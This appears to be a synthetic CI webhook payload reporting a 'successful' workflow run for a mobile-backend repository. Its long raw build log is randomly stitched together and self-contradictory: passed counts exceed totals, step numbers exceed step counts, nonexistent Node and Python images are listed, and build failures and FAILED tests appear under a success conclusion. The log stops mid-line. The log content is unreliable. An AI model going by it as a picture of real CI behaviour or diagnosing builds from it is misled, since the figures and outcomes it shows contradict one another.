{
  "action": "completed",
  "workflow_run": {
    "id": 407,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "6dc5faf23ff90b211aff5a1d5e4cfee56809d63e",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-05T12:18:45.803911Z",
    "updated_at": "2025-12-05T12:23:12.622584Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: type_check ===\nException: TypeError\nCompleted.\nBuilding Docker image...\nGenerating source maps...\nLayer 4/11: ENV command\nCompiling lib/app.ts...\nInstalling eslint@5.19.1\nnpm install: resolved 1987 packages\n\u2717 build failed with exit code 86\nProcessing...\nTLS handshake completed\nnpm notice: package.json updated\nUsing Python 3.10\nFinished.\n[12:18:45] INFO: Starting build process\nBundling main.js\nPulling image: node:3.11\npip: Collecting webpack\nCompiling components/service.java...\nTransforming 394 files...\nCompiling utils/handler.rs...\n  PASS: integration/test_user_create.spec.js\nFinished.\npip: Collecting webpack\nStep 5/22: Installing dependencies\npip install: Successfully installed lodash-1.8\nStep 15/23: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Downloading jest-3.11.tar.gz\nDone.\nImage pulled successfully\n[12:18:45] WARN: Deprecated API usage\n\u2713 Task completed in 5000ms\nStep 13/16: Installing dependencies\n[12:18:45] DEBUG: Loading configuration\nnpm notice: package.json updated\nAlready up to date.\nDone.\nCache saved successfully\nUploading artifact 'build' (35 files)\nTest Suites: 49 passed, 29 total\nSuccess!\n[12:18:45] INFO: Cache refreshed\nTest Suites: 48 passed, 9 total\n[12:18:45] DEBUG: Memory usage: 1209MB\n[12:18:45] ERROR: Connection failed\nnpm notice: package.json updated\n[12:18:45] DEBUG: Initializing service\n[12:18:45] WARN: Deprecated API usage\nCache restored successfully (457MB)\nFetching submodules...\nSwitched to branch 'hotfix/task-930'\nTest Suites: 29 passed, 36 total\nSwitched to branch 'feature/task-654'\nCache hit for key-1516\n  PASS: test_db_connect (495ms)\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (35MB)\nSwitched to branch 'bugfix/task-980'\nPOST /api - 200 (279ms)\nnpm install: added 486 packages\nLayer 8/14: RUN command\nRan 82 tests in 7s\nGET /status - 201 (63ms)\nCompiling components/app.ts...\n[12:18:45] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (50MB)\nUsing Node.js 17.14.0\nHEAD is now at 2b54d65\nPulling image: node:latest\nBuilding Docker image...\nRan 15 tests in 43s\nFetching submodules...\nTests: 210 passed, 276 total\n[12:18:45] DEBUG: Initializing service\nWaiting...\nTest Suites: 7 passed, 17 total\nWaiting...\npip install: Successfully installed prettier-2.10\nCompiling utils/handler.rs...\nStep 19/17: Testing\nAlready up to date.\n[12:18:45] DEBUG: Loading configuration\nTests: 144 passed, 202 total\nCreating production build...\n[12:18:45] INFO: Connecting to database\n\u2713 Step 'test' succeeded\n[12:18:45] INFO: Starting build process\nFinished.\nVerifying...\nArtifact downloaded: 18MB\nArtifact uploaded: build.tar.gz (41MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: prettier has known vulnerabilities\nSnapshots: 23 passed, 16 total\nUploading artifact 'dist' (43 files)\nSwitched to branch 'feature/task-708'\nStep 1/17: Testing\nProcessing...\nAlready up to date.\n[12:18:45] INFO: Processing request\nnpm notice: package.json updated\nLoading...\nFinished.\nSnapshots: 25 passed, 28 total\nCompiling components/index.js...\nImage pulled successfully\nTest Suites: 23 passed, 36 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache miss for key-1882\nPlatform: darwin-arm64\n[12:18:45] INFO: Starting build process\nReady.\nArtifact uploaded: build.tar.gz (44MB)\nCache restored successfully (201MB)\nCompiling lib/utils.go...\nCache hit for key-3645\n[12:18:45] WARN: Deprecated API usage\nCache saved successfully\nHEAD is now at 654b7aa\n[12:18:45] INFO: Request completed\nStep 15/22: Building\nnpm install: resolved 939 packages\nTests: 206 passed, 65 total\nConnecting to acme.corp:443...\nStep 1/19: Linting\nChecking out master branch\n[12:18:45] DEBUG: Initializing service\nCache saved successfully\nWARNING: webpack has known vulnerabilities\nPlatform: linux-x64\nnpm install: added 382 packages\nnpm notice: created a lockfile\nCompleted.\n[12:18:45] WARN: Deprecated API usage\nSuccess!\n[12:18:45] WARN: Deprecated API usage\n[12:18:45] INFO: Starting build process\n[12:18:45] INFO: Starting build process\nStep 3/24: Running migrations\nGenerating source maps...\nCoverage: 84% statements, 68% branches\nStep 15/21: Testing\nSwitched to branch 'hotfix/task-969'\nInstalling prettier@2.2.7\n[12:18:45] ERROR: Connection failed\nTests: 340 passed, 161 total\npip: Installing build dependencies...\nStep 20/15: Installing dependencies\n=== Step type_check completed ===\n=== Step: unit_tests ===\nWARNING: jest has known vulnerabilities\nUploading artifact 'build' (29 files)\nBuilding Docker image...\n\u2713 All checks passed\nCache saved successfully\nCache hit for key-1217\nTest Suites: 42 passed, 34 total\n[12:18:45] INFO: Processing request\nSwitched to branch 'bugfix/task-230'\nOK\nEnvironment: development\nBundling vendor.css\nImage pulled successfully\nLoading...\n[12:18:45] INFO: Connecting to database\n[12:18:45] DEBUG: Query executed in 27ms\nSuccess!\nDone.\nTest Suites: 14 passed, 19 total\n[12:18:45] DEBUG: Loading configuration\nBuilding Docker image...\nCache restored successfully (140MB)\n[12:18:45] INFO: Processing request\n[12:18:45] INFO: Request completed\nCompiling lib/main.py...\nCreating production build...\nCoverage: 91% statements, 64% branches\nRan 142 tests in 16s\nFetching submodules...\n[12:18:45] WARN: Deprecated API usage\n\u2713 All checks passed\nFinished.\nFetching submodules...\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 package completed\nnpm notice: created a lockfile\nRan 116 tests in 31s\n[12:18:45] INFO: Processing request\nCreating production build...\nTransforming 937 files...\n[12:18:45] INFO: Connecting to database\nTests: 122 passed, 492 total\npip install: Successfully installed react-5.11\n  PASS: unit/test_auth_login.spec.js\npip: Installing build dependencies...\nCreating production build...\nCompiling src/utils.go...\nNODE_ENV=production\nFetching submodules...\nFAILED: test_db_connect\nCache saved successfully\n[12:18:45] INFO: Request completed\n[12:18:45] DEBUG: Loading configuration\nCompleted.\nCompiling utils/service.java...\nCompiling components/app.ts...\nArtifact uploaded: dist.zip (88MB)\nTLS handshake completed\nOK\nyarn add: Done in 7.27s\nConnecting to example.com:443...\nUsing Python 3.11\nPushing to registry...\nCache invalidated: node_modules\nException: TypeError\nOK\nRan 37 tests in 22s\nCompiling lib/main.py...\nCompiling src/service.java...\n[12:18:45] DEBUG: Memory usage: 1880MB\nArtifact uploaded: build.tar.gz (31MB)\n[12:18:45] WARN: Deprecated API usage\n[12:18:45] INFO: Request completed\nStep 8/19: Testing\nHEAD is now at ac72dc1\n[12:18:45] WARN: Deprecated API usage\n  PASS: unit/test_cache_hit.spec.js\nStep 14/15: Building\nCache invalidated: build\n[12:18:45] WARN: Deprecated API usage\nPushing to registry...\nChecking out main branch\nEnvironment: staging\n[12:18:45] INFO: Processing request\nUsing Node.js 18.5.6\nStep 12/19: Installing dependencies\n[12:18:45] DEBUG: Initializing service\n[12:18:45] DEBUG: Connection pool: 5 active\nnpm notice: created a lockfile\nTests: 401 passed, 401 total\nBundling styles.css\n[12:18:45] INFO: Processing request\n[12:18:45] WARN: Deprecated API usage\nFetching submodules...\n[12:18:45] INFO: Connecting to database\nnpm install: added 154 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\nCompleted.\nStep 19/16: Linting\n[12:18:45] INFO: Processing request\nFAILED: test_cache_hit\nGET /api - 201 (91ms)\nChecking out main branch\nCache miss for key-2906\nStep 12/17: Installing dependencies\nBundling main.css\nCompiling src/main.py...\nWARNING: axios has known vulnerabilities\nTime: 109.307s\nTLS handshake completed\nArtifact downloaded: 14MB\n[12:18:45] WARN: Deprecated API usage\nFAILED: test_cache_hit\n[12:18:45] INFO: Starting build process\nnpm install: resolved 707 packages\nFinished.\nUsing Python 3.11\nFinished.\nTime: 37.298s\nBundling runtime.css\nStep 10/23: Installing dependencies\nEnvironment: test\nCache hit for key-6237\nInstalling prettier@3.0.10\nStep 17/22: Building\nCache hit for key-2946\nHEAD is now at 650eb95\nCache invalidated: node_modules\nOptimizing 59 modules...\nConnection established\nUsing Node.js 14.11.3\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWaiting...\nCompiling src/utils.go...\n[12:18:45] DEBUG: Connection pool: 20 active\nGenerating source maps...\nCompiling components/app.ts...\n[12:18:45] INFO: Processing request\nnpm install: resolved 1385 packages\npip install: Successfully installed axios-5.11\nTLS handshake completed\nConnection established\nArtifact downloaded: 49MB\nStep 12/17: Building\n[12:18:45] INFO: Starting build process\nStep 6/21: Deploying\n=== Step unit_tests completed ===\n=== Step: save_cache ===\n[12:18:45] INFO: Processing request\nStep 15/25: Building\npip install: Successfully installed prettier-3.15\nUploading artifact 'dist' (12 files)\nArtifact uploaded: build.tar.gz (1MB)\npip: Installing build dependencies...\nTransforming 280 files...\nCompiling utils/main.py...\nChecking out main branch\nGenerating source maps...\nWARNING: express has known vulnerabilities\nStep 8/25: Deploying\nWARNING: lodash has known vulnerabilities\nSuccess!\nFetching submodules...\nLayer 2/10: ENV command\nWARNING: axios has known vulnerabilities\nNODE_ENV=production\n[12:18:45] WARN: Deprecated API usage\nStep 5/15: Linting\n[12:18:45] DEBUG: Loading configuration\nStep 18/21: Linting\n  PASS: test_auth_login (112ms)\nStep 5/16: Testing\n[12:18:45] WARN: Deprecated API usage\npip install: Successfully installed eslint-2.2\nCompiling src/service.java...\n[12:18:45] INFO: Request completed\n[12:18:45] INFO: Starting build process\nFinished.\nCoverage: 90% statements, 68% branches\nCompiling components/handler.rs...\nPlatform: win32-x64\nEnvironment: production\nHEAD is now at 1ac6895\nyarn add: Done in 19.4s\n[12:18:45] DEBUG: Query executed in 33ms\nAlready up to date.\nChecking out master branch\nInstalling prettier@4.16.0\npip: Downloading axios-4.15.tar.gz\nChecking out master branch\n\u2713 Step 'setup' succeeded\nCache miss for key-9675\nStep 11/15: Installing dependencies\nPOST /data - 200 (311ms)\nCompleted.\n\u2713 Step 'test' succeeded\nCompiling src/handler.rs...\nFetching submodules...\nTest Suites: 17 passed, 14 total\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-2615\nPlatform: linux-x64\npip: Collecting eslint\nPlatform: win32-x64\nBuilding Docker image...\nPOST /data - 200 (366ms)\n\u2713 All checks passed\n\u2713 Step 'build' succeeded\npip: Collecting lodash\nPushing to registry...\nPlatform: linux-x64\nDone.\nCompiling components/utils.go...\npip: Downloading prettier-2.7.tar.gz\nSnapshots: 2 passed, 20 total\nDone.\nFetching submodules...\nProcessing...\nBuilding Docker image...\nChecking out develop branch\npip: Downloading react-5.17.tar.gz\nnpm install: resolved 467 packages\nFinished.\nLoading...\nArtifact downloaded: 29MB\nProcessing...\n  PASS: e2e/test_cache_hit.spec.js\n\u2713 All checks passed\n[12:18:45] INFO: Starting build process\nStep 13/20: Running migrations\nCompleted.\nFAILED: test_auth_login\nCompiling src/main.py...\nStep 5/16: Linting\nBundling runtime.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 7/22: Building\nCompiling components/utils.go...\nReady.\nCompleted.\nLayer 9/14: RUN command\npip: Installing build dependencies...\nTest Suites: 14 passed, 37 total\nStep 20/20: Building\nWARNING: webpack has known vulnerabilities\nTime: 89.781s\nWARNING: prettier has known vulnerabilities\nWARNING: jest has known vulnerabilities\n[12:18:45] INFO: Request completed\n[12:18:45] INFO: Starting build process\nRan 194 tests in 28s\nCache invalidated: node_modules\nArtifact uploaded: dist.zip (7MB)\nEnvironment: development\n\u2713 Task completed in 2205ms\nPulling image: python:18\nCompiling utils/index.js...\nCache saved successfully\nWARNING: jest has known vulnerabilities\n[12:18:45] INFO: Request completed\nFetching submodules...\nInstalling react@1.15.6\n  PASS: integration/test_auth_login.spec.js\n\u2713 Task completed in 3960ms\nTransforming 814 files...\nEnvironment: production\npip install: Successfully installed react-1.3\nBuilding Docker image...\n  PASS: test_db_connect (186ms)\nChecking out main branch\nReady.\nUploading artifact 'build' (39 files)\nTLS handshake completed\nArtifact uploaded: dist.zip (51MB)\npip: Downloading express-2.13.tar.gz\n[12:18:45] INFO: Connecting to database\nCreating production build...\nTime: 5.190s\nBuilding Docker image...\nSnapshots: 28 passed, 45 total\nStep 10/17: Testing\nSuccess!\nWARNING: lodash has known vulnerabilities\n[12:18:45] DEBUG: Connection pool: 3 active\nCache saved successfully\nTests: 406 passed, 99 total\nTransforming 666 files...\nHEAD is now at 0e41a5f\n[12:18:45] INFO: Connecting to database\npip install: Successfully installed react-3.12\npip install: Successfully installed axios-4.20\nCompleted.\nOK\n  PASS: test_user_create (258ms)\nConnection established\n  PASS: integration/test_auth_login.spec.js\nCache restored successfully (46MB)\n=== Step save_cache completed ===\n=== Step: lint ===\nCache saved successfully\nUsing Node.js 20.10.3\nDone.\nUsing Python 3.10\nMinifying app.js\nGenerating source maps...\nArtifact uploaded: dist.zip (46MB)\nArtifact uploaded: dist.zip (31MB)\nVerifying...\nTLS handshake completed\nCoverage: 77% statements, 93% branches\nWaiting...\nCoverage: 87% statements, 74% branches\nFetching submodules...\nWaiting...\n[12:18:45] DEBUG: Loading configuration\n[12:18:45] DEBUG: Connection pool: 12 active\n  PASS: e2e/test_db_connect.spec.js\nArtifact uploaded: build.tar.gz (37MB)\nPulling image: alpine:3.11\npip: Downloading express-2.17.tar.gz\n[12:18:45] DEBUG: Query executed in 37ms\n[12:18:45] DEBUG: Query executed in 98ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching submodules...\nPOST /api - 200 (347ms)\nImage pulled successfully\nSnapshots: 1 passed, 16 total\nArtifact uploaded: build.tar.gz (14MB)\nSwitched to branch 'bugfix/task-326'\n[12:18:45] DEBUG: Connection pool: 12 active\nImage pulled successfully\n[12:18:45] DEBUG: Query executed in 59ms\nPulling image: python:3.11\nOK\nTest Suites: 34 passed, 23 total\n[12:18:45] WARN: Deprecated API usage\nNODE_ENV=test\nLayer 9/12: ENV command\nConnecting to test.io:443...\nWaiting...\n[12:18:45] DEBUG: Connection pool: 13 active\nFinished.\nImage pulled successfully\nConnecting to cloud.services:443...\nCache restored successfully (259MB)\nBundling main.css\nPlatform: darwin-arm64\nCache saved successfully\nTransforming 797 files...\nException: RuntimeError\npip: Collecting express\nCache restored successfully (36MB)\nUsing Python 3.11\n[12:18:45] DEBUG: Connection pool: 10 active\nConnecting to acme.corp:443...\nUploading artifact 'build' (3 files)\nCreating production build...\nArtifact uploaded: dist.zip (72MB)\nConnecting to test.io:443...\npip: Installing build dependencies...\nStep 3/16: Building\nUsing Node.js 16.9.1\npip: Downloading eslint-3.20.tar.gz\npip: Collecting axios\nInstalling lodash@5.5.10\nStep 18/23: Testing\nFetching submodules...\nPlatform: linux-x64\nCompiling lib/app.ts...\npip install: Successfully installed lodash-3.3\nTest Suites: 30 passed, 38 total\nGET /api - 201 (19ms)\nnpm install: added 406 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 5/23: Running migrations\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\nBuilding Docker image...\nFAILED: test_api_health\nCreating production build...\nBundling styles.css\nHEAD is now at 6ae6a02\nFinished.\nWARNING: react has known vulnerabilities\npip: Collecting axios\nWARNING: jest has known vulnerabilities\npip install: Successfully installed axios-4.18\npip: Downloading eslint-1.20.tar.gz\nBundling styles.css\nWaiting...\n[12:18:45] INFO: Starting build process\nArtifact uploaded: build.tar.gz (9MB)\nNODE_ENV=test\nOK\nDone.\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-1387\nWARNING: webpack has known vulnerabilities\nAlready up to date.\n[12:18:45] DEBUG: Memory usage: 1031MB\nInstalling axios@4.7.8\nnpm notice: package.json updated\nCache restored successfully (278MB)\nCache saved successfully\nMinifying app.js\nyarn add: Done in 5.55s\nStep 14/18: Testing\nPlatform: darwin-arm64\npip install: Successfully installed webpack-1.0\n\u2713 Step 'test' succeeded\nStep 10/22: Deploying\nRan 169 tests in 57s\n[12:18:45] WARN: Deprecated API usage\nCompiling lib/handler.rs...\n\u2713 Step 'test' succeeded\nProcessing...\nWARNING: lodash has known vulnerabilities\nConnecting to acme.corp:443...\nCache invalidated: dependencies\nCache invalidated: dependencies\nCache hit for key-4147\nArtifact uploaded: build.tar.gz (6MB)\nStep 10/18: Building\nUploading artifact 'dist' (4 files)\nUploading artifact 'build' (16 files)\nWARNING: express has known vulnerabilities\nCache hit for key-2950\nSwitched to branch 'bugfix/task-178'\nCache saved successfully\nSwitched to branch 'hotfix/task-649'\nSnapshots: 15 passed, 16 total\nStep 12/22: Building\nStep 8/19: Testing\nImage pulled successfully\n[12:18:45] ERROR: Connection failed\n[12:18:45] INFO: Request completed\nMinifying app.js\nCompiling src/app.ts...\nPOST /data - 201 (224ms)\nSuccess!\nCompiling lib/service.java...\nTests: 436 passed, 463 total\nVerifying...\npip: Collecting jest\nSwitched to branch 'bugfix/task-143'\nCache saved successfully\n[12:18:45] DEBUG: Connection pool: 7 active\n=== Step lint completed ===\n=== Step: install_dependencies ===\nTime: 14.526s\nUsing Python 3.10\n[12:18:45] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/service.java...\nBuilding Docker image...\nCreating production build...\nFetching submodules...\n[12:18:45] INFO: Processing request\npip: Downloading jest-5.14.tar.gz\nArtifact uploaded: dist.zip (48MB)\nOK\nTests: 455 passed, 86 total\nTransforming 227 files...\nCompiling lib/utils.go...\nPushing to registry...\n[12:18:45] DEBUG: Connection pool: 1 active\nLoading...\nStep 12/23: Linting\nSwitched to branch 'hotfix/task-208'\nMinifying main.js\nOK\n[12:18:45] DEBUG: Connection pool: 6 active\nVerifying...\nWARNING: react has known vulnerabilities\nOptimizing 100 modules...\nChecking out master branch\n  PASS: test_db_connect (410ms)\nGenerating source maps...\npip: Collecting webpack\nTime: 90.765s\npip: Downloading jest-5.2.tar.gz\nCompleted.\n[12:18:45] DEBUG: Query executed in 86ms\nLayer 9/15: COPY command\n[12:18:45] DEBUG: Connection pool: 9 active\nStep 6/22: Linting\nArtifact downloaded: 11MB\npip: Installing build dependencies...\nNODE_ENV=production\nCache hit for key-5983\nInstalling axios@4.4.3\nnpm notice: created a lockfile\npip install: Successfully installed express-5.9\nEnvironment: test\nPlatform: darwin-arm64\npip: Collecting lodash\nCoverage: 78% statements, 81% branches\nStep 1/17: Deploying\nStep 15/18: Linting\nWARNING: lodash has known vulnerabilities\nWARNING: jest has known vulnerabilities\nMinifying vendor.js\n[12:18:45] INFO: Connecting to database\nOK\nLoading...\n[12:18:45] DEBUG: Loading configuration\nStep 9/24: Installing dependencies\nStep 14/22: Linting\nCompiling src/handler.rs...\nConnecting to startup.dev:443...\nEnvironment: staging\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Python 3.11\nStep 2/16: Building\n  PASS: unit/test_auth_login.spec.js\n[12:18:45] INFO: Request completed\nUploading artifact 'coverage' (29 files)\nAlready up to date.\nTests: 128 passed, 498 total\nConnecting to example.com:443...\nnpm install: added 432 packages\nStep 10/23: Deploying\npip: Installing build dependencies...\nStep 4/19: Testing\nSuccess!\n[12:18:45] DEBUG: Loading configuration\nHEAD is now at 91333ea\nStep 19/25: Building\nLoading...\nWaiting...\nLayer 6/10: COPY command\nnpm install: added 465 packages\nPushing to registry...\nSwitched to branch 'feature/task-186'\nUploading artifact 'coverage' (22 files)\n[12:18:45] DEBUG: Initializing service\nLayer 4/8: RUN command\nUsing Python 3.9\nSuccess!\nLoading...\nPulling image: alpine:latest\n[12:18:45] INFO: Processing request\nEnvironment: production\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 Step 'test' succeeded\nStep 5/15: Building\n[12:18:45] WARN: Deprecated API usage\nInstalling jest@5.15.4\nSnapshots: 42 passed, 0 total\nBuilding Docker image...\nMinifying main.js\nUsing Python 3.9\nNODE_ENV=test\n  PASS: test_cache_hit (452ms)\nUsing Python 3.12\nArtifact uploaded: dist.zip (7MB)\nCache hit for key-2866\n[12:18:45] DEBUG: Memory usage: 1773MB\nCompiling src/app.ts...\nUploading artifact 'dist' (11 files)\n[12:18:45] INFO: Request completed\n[12:18:45] DEBUG: Memory usage: 857MB\nNODE_ENV=development\n[12:18:45] DEBUG: Connection pool: 6 active\nRan 33 tests in 42s\n\u2717 build failed with exit code 86\nCompiling components/handler.rs...\nPulling image: alpine:18\nRan 197 tests in 59s\nCreating production build...\nCompiling utils/index.js...\n\u2713 Step 'build' succeeded\n[12:18:45] DEBUG: Query executed in 40ms\nFetching submodules...\nCache saved successfully\n[12:18:45] INFO: Connecting to database\n\u2713 deploy completed\n[12:18:45] INFO: Starting build process\nnpm install: resolved 477 packages\nReady.\nTime: 83.940s\nLoading...\nnpm notice: created a lockfile\n[12:18:45] INFO: Request completed\nArtifact uploaded: build.tar.gz (2MB)\n[12:18:45] INFO: Cache refreshed\n\u2713 lint completed\nTime: 86.686s\n\u2713 Step 'install' succeeded\n[12:18:45] DEBUG: Loading configuration\nCache invalidated: build\n\u2713 test completed\nDone.\n  PASS: integration/test_api_health.spec.js\n[12:18:45] DEBUG: Initializing service\n=== Step install_dependencies completed ===\n=== Step: integration_tests ===\n\u2713 Step 'setup' succeeded\nCache hit for key-2749\nDone.\nProcessing...\nConnection established\nCache miss for key-4860\nHEAD is now at 808600a\nGET /status - 200 (84ms)\npip: Collecting prettier\nPOST /data - 202 (214ms)\nStep 6/19: Testing\nChecking out develop branch\nAlready up to date.\nGenerating source maps...\nReady.\nException: TypeError\nBuilding Docker image...\nFAILED: test_api_health\nStep 19/17: Deploying\nnpm notice: created a lockfile\nEnvironment: staging\n[12:18:45] INFO: Cache refreshed\nyarn add: Done in 19.78s\nVerifying...\n[12:18:45] INFO: Connecting to database\nnpm install: added 410 packages\nChecking out master branch\nSwitched to branch 'bugfix/task-779'\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 85 modules...\n\u2713 All checks passed\nStep 10/17: Installing dependencies\nTest Suites: 36 passed, 34 total\nTLS handshake completed\npip: Installing build dependencies...\npip: Installing build dependencies...\nTransforming 276 files...\nImage pulled successfully\nArtifact uploaded: dist.zip (56MB)\n\u2717 build failed with exit code 109\nCompiling src/handler.rs...\nStep 11/15: Linting\nException: RuntimeError\npip: Downloading lodash-4.11.tar.gz\nArtifact uploaded: dist.zip (68MB)\nCompiling utils/app.ts...\nTransforming 546 files...\nSnapshots: 18 passed, 27 total\nBuilding Docker image...\nChecking out main branch\nOK\n[12:18:45] DEBUG: Query executed in 63ms\nnpm install: resolved 1151 packages\nUsing Python 3.12\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCreating production build...\nAlready up to date.\nTime: 99.778s\nArtifact uploaded: dist.zip (48MB)\nSuccess!\nTest Suites: 35 passed, 12 total\n  PASS: unit/test_user_create.spec.js\nHEAD is now at 4f20ecd\nCoverage: 99% statements, 93% branches\nTime: 30.990s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\nInstalling jest@2.14.10\nNODE_ENV=development\nVerifying...\nCompiling lib/service.java...\nCoverage: 96% statements, 97% branches\nUsing Node.js 19.16.10\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /data - 200 (340ms)\nCompiling components/index.js...\nOK\nOK\nFetching submodules...\n[12:18:45] DEBUG: Query executed in 64ms\nAlready up to date.\nOK\nWARNING: express has known vulnerabilities\nCache invalidated: dependencies\nnpm install: added 93 packages\nStep 1/22: Deploying\nLoading...\nTLS handshake completed\nDone.\nWaiting...\nPushing to registry...\n\u2713 Task completed in 507ms\nAlready up to date.\nPushing to registry...\nFAILED: test_user_create\nArtifact downloaded: 9MB\nSuccess!\n[12:18:45] INFO: Request completed\nCache saved successfully\nVerifying...\nWARNING: express has known vulnerabilities\nCache restored successfully (194MB)\nSuccess!\nCompiling lib/utils.go...\n[12:18:45] INFO: Starting build process\n[12:18:45] WARN: Deprecated API usage\nHEAD is now at 6a87080\nChecking out master branch\nChecking out develop branch\nOK\nCache restored successfully (411MB)\nMinifying app.js\nUsing Python 3.11\nBundling vendor.js\n[12:18:45] INFO: Processing request\nNODE_ENV=production\n[12:18:45] DEBUG: Initializing service\nConnecting to acme.corp:443...\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 78% statements, 91% branches\n\u2713 Task completed in 4838ms\n[12:18:45] INFO: Request completed\nStep 14/17: Running migrations\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (42MB)\nRan 19 tests in 31s\nBundling runtime.css\nProcessing...\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_db_connect (96ms)\nImage pulled successfully\nnpm notice: package.json updated\nUsing Python 3.12\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip install: Successfully installed express-4.15\nPlatform: win32-x64\n[12:18:45] WARN: Deprecated API usage\nTransforming 465 files...\nStep 9/20: Running migrations\n[12:18:45] DEBUG: Query executed in 82ms\nRan 200 tests in 29s\n[12:18:45] DEBUG: Memory usage: 1626MB\nnpm install: added 457 packages\nTime: 105.606s\n=== Step integration_tests completed ===\n=== Step: deploy_production ===\nNODE_ENV=test\nCache invalidated: node_modules\nUsing Node.js 16.6.2\nCompiling components/utils.go...\nCache hit for key-6154\nPushing to registry...\nMinifying vendor.js\n[12:18:45] INFO: Connecting to database\nnpm install: resolved 1107 packages\nGET /status - 204 (35ms)\nTime: 6.602s\n[12:18:45] ERROR: Connection failed\nStep 19/15: Deploying\n[12:18:45] DEBUG: Initializing service\n[12:18:45] DEBUG: Initializing service\nStep 13/15: Linting\nStep 20/21: Building\nTests: 138 passed, 465 total\nUsing Node.js 16.19.5\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\nUsing Node.js 20.17.4\nCache saved successfully\nBundling styles.css\nPushing to registry...\nNODE_ENV=production\nVerifying...\nCache miss for key-1158\nStep 7/22: Deploying\nException: TypeError\nHEAD is now at faa0159\nLoading...\npip: Collecting webpack\nReady.\n[12:18:45] DEBUG: Query executed in 86ms\nHEAD is now at 9e523d4\n[12:18:45] INFO: Processing request\nChecking out main branch\nFetching submodules...\nPlatform: darwin-arm64\nCache miss for key-8399\nNODE_ENV=development\n\u2713 Step 'test' succeeded\nnpm notice: created a lockfile\nVerifying...\npip: Collecting prettier\nCache invalidated: node_modules\n[12:18:45] DEBUG: Initializing service\n[12:18:45] WARN: Deprecated API usage\nGenerating source maps...\npip install: Successfully installed express-5.20\nCache restored successfully (466MB)\nDone.\nArtifact uploaded: dist.zip (12MB)\nyarn add: Done in 26.81s\n\u2713 test completed\nTests: 352 passed, 128 total\n\u2717 build failed with exit code 121\nnpm install: resolved 1013 packages\nBuilding Docker image...\nnpm install: resolved 756 packages\nTLS handshake completed\nSuccess!\nStep 20/23: Linting\nFinished.\nBundling styles.js\n[12:18:45] DEBUG: Connection pool: 17 active\nStep 2/25: Running migrations\nSwitched to branch 'feature/task-734'\n[12:18:45] DEBUG: Query executed in 50ms\nTransforming 604 files...\nLoading...\nUsing Python 3.12\nFetching submodules...\n[12:18:45] WARN: Deprecated API usage\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:45] INFO: Cache refreshed\nCache invalidated: dependencies\n\u2713 build completed\n\u2713 Step 'setup' succeeded\nArtifact downloaded: 9MB\nCompleted.\nUploading artifact 'dist' (46 files)\nVerifying...\nStep 13/19: Testing\nStep 15/22: Linting\nConnection established\nSuccess!\nNODE_ENV=development\nCache invalidated: dependencies\n[12:18:45] DEBUG: Connection pool: 8 active\n\u2713 Task completed in 2440ms\nyarn add: Done in 18.66s\nStep 18/21: Testing\npip: Collecting lodash\nWARNING: express has known vulnerabilities\nSwitched to branch 'bugfix/task-962'\nArtifact downloaded: 37MB\n\u2717 build failed with exit code 88\n[12:18:45] INFO: Processing request\n[12:18:45] ERROR: Connection failed\nArtifact uploaded: dist.zip (1MB)\nUploading artifact 'coverage' (17 files)\nWARNING: jest has known vulnerabilities\nWARNING: eslint has known vulnerabilities\nFinished.\nCompiling utils/utils.go...\nFetching submodules...\nFetching submodules...\nTest Suites: 32 passed, 49 total\nReady.\nEnvironment: test\nLoading...\nStep 10/22: Building\nCache restored successfully (333MB)\nLayer 7/11: RUN command\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSwitched to branch 'feature/task-454'\npip: Collecting webpack\nUsing Python 3.10\nStep 8/18: Deploying\nHEAD is now at c3c8205\n\u2713 Step 'install' succeeded\n  PASS: test_cache_hit (427ms)\nCache restored successfully (97MB)\n[12:18:45] INFO: Request completed\nCache saved successfully\nConnecting to cloud.services:443...\nBundling main.js\npip: Collecting react\nConnection established\nCompiling utils/main.py...\nOK\nReady.\n[12:18:45] DEBUG: Initializing service\nException: TypeError\nTest Suites: 44 passed, 25 total\n  PASS: integration/test_db_connect.spec.js\nCache miss for key-6713\n[12:18:45] INFO: Cache refreshed\nTests: 212 passed, 387 total\nTransforming 374 files...\n[12:18:45] WARN: Deprecated API usage\n[12:18:45] INFO: Request completed\nLayer 10/15: ENV command\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 6/23: Building\n=== 